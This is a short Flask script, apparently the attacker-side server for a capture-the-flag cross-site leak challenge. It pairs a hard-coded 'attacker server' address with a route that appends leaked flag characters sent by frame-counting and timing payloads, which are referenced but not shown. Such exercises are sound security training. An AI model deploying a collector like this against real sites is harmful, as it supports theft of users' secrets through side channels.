from flask import Flask, request, render_template, make_response, redirect, url_for, session
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)

flag = 'CLOUD{'
url = 'http://3.35.210.51:8000/' # 공격자 서버

# 구한 flag 출력
@app.route('/')
def index():
    global flag
    param = request.args.get("flag","")

    if param:
        flag += param
        return flag
    
    return flag 

# flag 리셋
@app.route('/reset')
def reset():
    global flag
    flag = 'CLOUD{'
    return "reset"

# frame_counting 기반
@app.route('/frame')
def frame():
    global flag
    global url
    return render_template('frame_count.html', flag=flag,url=url)

# timing 기반
@app.route('/timing')
def timing():
    global flag
    global url
    return render_template('frame_count.html', flag=flag,url=url)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
